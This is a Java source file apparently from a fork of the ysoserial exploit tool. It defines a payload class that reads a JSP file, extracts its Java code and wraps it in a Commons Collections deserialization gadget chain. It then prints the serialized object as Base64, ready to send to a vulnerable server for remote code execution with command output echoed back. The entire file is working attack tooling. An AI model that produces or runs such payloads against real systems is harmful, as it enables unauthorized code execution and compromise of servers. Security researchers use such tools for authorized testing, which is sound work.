package ysoserial.payloads;

import org.apache.commons.codec.binary.Base64;
import ysoserial.Serializer;
import ysoserial.payloads.util.PayloadRunner;
import java.io.FileReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class RCEECHO extends PayloadRunner implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception{
        byte[] ser = Serializer.serialize(new RCEECHO().getObject("D:\\ysoserial-8\\src\\main\\resources\\Java-Rce-Echo\\Linux\\code\\case2.jsp"));
        System.out.println(Base64.encodeBase64String(ser));
    }
    public Object getObject(String poc) throws Exception {
        String code = RCEECHO.getJavaCode(poc);
        Object evil = new CC_MapTransformer().getObject("RCEECHO;" + code);
        return evil;
    }
    public static String getJavaCode(String poc) throws Exception{
        FileReader f = new FileReader(poc);
        char[] c = new char[0xffff];
        f.read(c);
        String code = new String(c);

        while (true){
            code = code.trim();
            int end = code.indexOf("%>");
            int i;
            if (code.startsWith("<%--")){
                code = code.substring(end+2);
                continue;
            }else if(code.startsWith("<%@")){
                Pattern pattern = Pattern.compile("<%\\@\\s+page import=\"(.*)\" %>");
                Matcher matcher = pattern.matcher(code);
                code = code.substring(end+2);
                if(matcher.find()) {
                    String s = matcher.group(1);
                    code = code.replaceAll("([^\\.\\w]+)"+s.substring(s.lastIndexOf(".") + 1) + "([^\\w]+)","$1"+s+"$2");
                }
                continue;
            }
            else if(code.startsWith("<jsp:directive.")
                || code.startsWith("<%!")
                || code.startsWith("<jsp:declaration")
                || code.startsWith("<%=")
                || code.startsWith("<jsp:expression")
            ) {
                code = code.substring(end+2);
                continue;
            }else if (code.startsWith("<%")) {
                code = code.substring(2,end);
                break;
            }else {
                return null;
            }
        }
        code = code.replaceAll("([^\\.\\w]+)"+"(DispatcherType|FilterDef|FilterChain|FilterConfig|HttpServletRequest|ServletException|ServletResponse|ServletRequest|ServletContext|Filter)"+ "([^\\w]+)","$1"+"javax.servlet."+"$2"+"$3");
        return code;
    }

}
